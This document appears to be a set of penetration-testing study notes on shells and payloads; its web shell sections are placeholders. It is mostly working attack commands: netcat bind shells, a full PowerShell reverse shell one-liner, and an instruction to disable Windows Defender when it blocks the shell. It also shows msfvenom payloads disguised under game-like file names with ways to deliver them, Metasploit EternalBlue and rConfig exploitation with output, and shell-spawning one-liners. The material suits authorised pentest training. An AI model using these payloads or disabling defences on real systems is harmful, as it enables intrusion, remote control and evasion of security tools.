# 🐚 Shells & Payloads  
*Delve into the forbidden arts of initial compromise, where whispers in the void become footholds in vulnerable hosts. This module equips the practitioner with eldritch techniques to summon shells and craft payloads—essential rites in breaching the veil between attacker and target, be they Windows or Linux systems.*

> *“To speak with the machine, one must first teach it to listen.”*

<details>
<summary><h1>📌 Shell Basics</h1></summary>

&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>⏩ Bind Shells</h2></summary>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Basic Bind Shell with Netcat</h3></summary>  

**Target Machine: Starting Netcat listener**  

```bash
nc -lvnp <PORT>
```

**Attack Machine: Connecting to target**  

```bash
nc -nv <IP> <PORT>
```

> **Note:** Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

</details>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Establishing a Basic Bind Shell with Netcat</h3></summary>  

**Target Machine: Starting Netcat listener**  

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <PORT> > /tmp/f
```  

**Attack Machine: Starting Netcat listener**  

```bash
nc -nv <IP> <PORT>
```

> **Note:** Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical.

</details>

</details>

&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>⏪ Reverse Shells</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Basic Reverse Shell with Netcat</h3></summary>  

**Attack Machine: Starting a listener**  

```bash
sudo nc -lvnp <PORT>
```

**Target Machine(Windows - CMD): Connect to the Attack Machine**  
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

If you get an error like this one:  
```cmd
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Disable the antivirus using Powershell
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Re-run the CMD command.

</details>
</details>


</details>

<details>
<summary><h1>📦 Payloads</h1></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Metasploit - Example</h3></summary>  

```bash
sudo msfconsole
```

**Inside the MSF Console**  

Searching Within Metasploit  

```bash
search smb
```

Selecting an Exploit  

```bash
use 56
```

Examining an Exploit's Options  

```bash
options
```

Setting Options  

```bash
set RHOSTS <TARGET IP>
set SMBUser <USER>
set SMBPass <PASSWORD>
set LHOST <ATTACKER IP>
set LPORT <ATTACKER PORT>
set PAYLOAD windows/meterpreter/reverse_tcp
```

Exploits Away  

```bash
run

# [*] Meterpreter session 1 opened (<ATTACKER IP>:<ATTACKER PORT> -> <TARGET IP>:<TARGET PORT>) at 2025-06-20 10:56:44 -0500

# (Meterpreter 1)(C:\Windows\system32) > 
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Crafting payloads with MSFvenom</h3></summary>  

**Attack Machine: List Payloads** 

```bash
msfvenom -l payloads
```

**Attack Machine: Building A Stageless Payload** 
  
```bash
msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -f <FILE FORMAT> > <OUTPUT FILE>
```

Examples:  

> **Linux:** msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

> **Windows:** msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > GTA_SA.exe  

**Target Machine: Download and execute** 

There are countless ways this can be done. Here are just some of the common ways:

> Email message with the file attached.  

> Download link on a website.  

> Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).  

> Via flash drive as part of an onsite penetration test.  

The payload in this form would almost certainly be detected by Windows Defender AV.


</details>
</details>


<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h1>🪟 Windows Shells</h1></summary>  
<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h3>Infiltrating Windows</h3></summary>  
<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h4>Enumerating Windows & Fingerprinting Methods</h4></summary>  

When utilizing ICMP to determine if the host is up, a typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response you will see.  

**Attack Machine:** Ping target
```bash
PING <WINDOWS IP> (<WINDOWS IP>): 56 data bytes
64 bytes from <WINDOWS IP>: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from <WINDOWS IP>: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from <WINDOWS IP>: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from <WINDOWS IP>: icmp_seq=3 ttl=128 time=11.265 ms
```

**Attack Machine:** Initialize an OS Identification scan against our target  

```bash
sudo nmap -v -O <WINDOWS IP>
```

**Attack Machine:** For each port Nmap sees as up, it will attempt to connect to the port and glean any information it can from it.  

```bash
sudo nmap -v <WINDOWS IP> --script banner.nse
```

> The examples shown above are just a few ways to help fingerprint and determine if a host is a Windows machine. It is by no means an exhaustive list, and there are many other checks you can do.

</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h4>Payload Types to Consider</h4></summary>

**DLLs:** File used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. Injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.

**Batch:** Text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter.  

**VBS:** Lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.

**MSI:** When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell.

**Powershell:** It is both a shell environment and scripting language. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.

</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h4>Procedures for Payload Generation, Transfer, and Execution</h4></summary>

* [MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework): MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.

* [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings): Here, you can find many different resources and cheat sheets for payload generation and general methodology.

* [Mythic C2 Framework](https://github.com/its-a-feature/Mythic): Alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.

* [Nishang](https://github.com/samratashok/nishang): Framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.

* [Darkarmour](https://github.com/bats3c/darkarmour): Tool to generate and utilize obfuscated binaries for use against Windows hosts.

</details>

</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h3>Example Compromise Walkthrough</h3></summary>

**Attack Machine: Enumerate the host**  

```bash
sudo nmap -sS -sV -sC -v -A -O <WINDOWS IP> --script banner.nse -oX nmap_target_xml_scan.xml > /dev/null 1 2>&1

xsltproc nmap_target_xml_scan.xml -o nmap_target_html_scan.html
```

**Attack Machine: Start Metasploit**  

Open msfconsole and search for the for the identified service.

```bash
msfconsole
```

**Attack Machine: Determine an Exploit Path**  

```bash
use auxiliary/scanner/smb/smb_ms17_010 
show options
set RHOSTS <WINDOWS IP>
run
```

Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.

**Attack Machine: Choose & Configure Our Exploit & Payload**

```bash
search eternal
use 2
options
```

Since I have had more luck with the psexec version of this exploit, we will try that one first. Let's choose it and continue the setup.

**Attack Machine: Validate Our Options**  

```bash
show options
```

This time, we kept it simple and just used a windows/meterpreter/reverse_tcp payload.

**Attack Machine: Execute Our Attack**  

```bash
exploit

# [*] Started reverse TCP handler on <ATTACKER IP>:4444 
# [*] <WINDOWS IP>:445 - Target OS: Windows Server 2016 Standard 14393
# [*] <WINDOWS IP>:445 - Built a write-what-where primitive...
# [+] <WINDOWS IP>:445 - Overwrite complete... SYSTEM session obtained!
```

Now that we have an open session through Meterpreter, we are presented with the meterpreter > prompt
If you wish to interact with the host directly, you can also drop into an interactive shell session on the host from Meterpreter.

**Attack Machine: Verify Our Session**  

```bash
getuid

# Server username: NT AUTHORITY\SYSTEM
```

From here, we can utilize Meterpreter to run further commands to gather system information, steal user credentials, or use another post-exploitation module against the host.


**Attack Machine: Identify Our Shell**  
```bash
shell

# Process 4844 created.
# Channel 1 created.
# Microsoft Windows [Version 10.0.14393]
# (c) 2016 Microsoft Corporation. All rights reserved.

# C:\Windows\system32>
```

When we executed the Meterpreter command shell, it started another process on the host and dropped us into a system shell.

</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h3>CMD or PowerShell</h3></summary>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h4>Differences</h4></summary>

# CMD vs PowerShell Comparison

| Feature          | CMD                              | PowerShell                      |
|------------------|----------------------------------|---------------------------------|
| **Origin**       | Original MS-DOS shell            | Designed to expand CMD's capabilities |
| **Command Language** | Native MS-DOS commands (`dir`, `ipconfig`) | Supports both MS-DOS and **.NET cmdlets** (`Get-ChildItem`, `Copy-Item`) |
| **Input/Output** | Text-based                       | **.NET objects** (structured data) |
| **Scripting**    | Basic batch files (`.bat`, `.cmd`) | Advanced scripts (`.ps1`) with loops, modules, and functions |
| **Command History** | **No** session logging | Keeps history of executed commands |
| **Security**     | No Execution Policy restrictions | Restricted by **Execution Policy** (e.g., `Restricted`, `RemoteSigned`) and UAC |
| **Availability** | Works on **all Windows versions** | Only available on **Windows 7+** |
| **Extensibility** | Limited to built-in commands | Supports **custom modules** and cmdlets |


</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h4>Which one is the right one to use?</h4></summary>

**Use CMD when:**

* You are on an older host that may not include PowerShell.

* When you only require simple interactions/access to the host.

* When you plan to use simple batch files, net commands, or MS-DOS native tools.

* When you believe that execution policies may affect your ability to run scripts or other actions on the host.

**Use PowerShell when:**

* You are planning to utilize cmdlets or other custom-built scripts.

* When you wish to interact with .NET objects instead of text output.

* When being stealthy is of lesser concern.

* If you are planning to interact with cloud-based services and hosts.

* If your scripts set and use Aliases.

</details>

> **Note:** PowerShell is more powerful but leaves traces (command history). CMD is lightweight but lacks advanced features.

</details>

</details>


<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h1>🐧 Linux/UNIX Shells</h1></summary>  
<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h2>Infiltrating Linux/UNIX</h2></summary>  
<details>

**Attack Machine: Enumerate the host**  

```bash
sudo nmap -sS -sV -sC -v -A -O <TARGET IP> --script banner.nse -oX nmap_target_xml_scan.xml > /dev/null 1 2>&1

xsltproc nmap_target_xml_scan.xml -o nmap_target_html_scan.html
```

**Attack Machine: Start Metasploit**  

Open msfconsole and search for the for the identified service.

```bash
msfconsole
```

**Attack Machine: Determine an Exploit Path**  

```bash
search rconfig
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

**Attack Machine: Configure Exploit Options**  

```bash
options
set RHOSTS <TARGET IP>
set LHOST <ATTACKER IP>
```

**Attack Machine: Execute the Exploit**  
```bash
exploit
```

**Attack Machine: Interact With the Shell**  
```bash
shell
```

**Attack Machine: Interact With the Shell**  
```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
```

</details>
</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h2>Spawning Interactive Shells</h2></summary>  

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h3>Spawn a shell</h3></summary>  

There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. 

**/bin/sh**

This command will execute the shell interpreter specified in the path in interactive mode (-i).

```bash
/bin/sh -i
# sh: no job control in this shell
```

**Perl**

If the programming language Perl is present on the system, these commands will execute the shell interpreter specified.

```bash
perl —e 'exec "/bin/sh";'
```

```bash
perl: exec "/bin/sh";\
# This command should be run from a script.
```

**Ruby**

If the programming language Ruby is present on the system, this command will execute the shell interpreter specified:

```bash
ruby: exec "/bin/sh"
# This command should be run from a script.
```

**Lua**

If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command below:

```bash
lua: os.execute('/bin/sh')
# This command should be run from a script.
```

**AWK**

AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. 

```bash
awk 'BEGIN {system("/bin/sh")}'
```

**Find**

Find is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria.

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

**Exec**

This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.

```bash
find . -exec /bin/sh \; -quit
```

**VIM**

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor VIM. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.

Vim To Shell  

```bash
vim -c ':!/bin/sh'
```

Vim Escape  
```bash
vim
:set shell=/bin/sh
:shell
```

</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h4>Execution Permissions</h4></summary>  

Permissions
```bash
ls -la <PATH>
```

Sudo
```bash
sudo -l
```

> Not only will considering permissions allow us to see what commands we can execute, but it may also start to give us an idea of potential vectors that will allow us to escalate privileges.

</details>

</details>

</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h1>🌐 Web Shells</h1></summary>  

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h2>Laudanum</h2></summary>  

Text

</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h2>Antak Webshell</h2></summary>  

Text

</details>

<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h2>PHP Web Shells</h2></summary>  

Text

</details>

</details>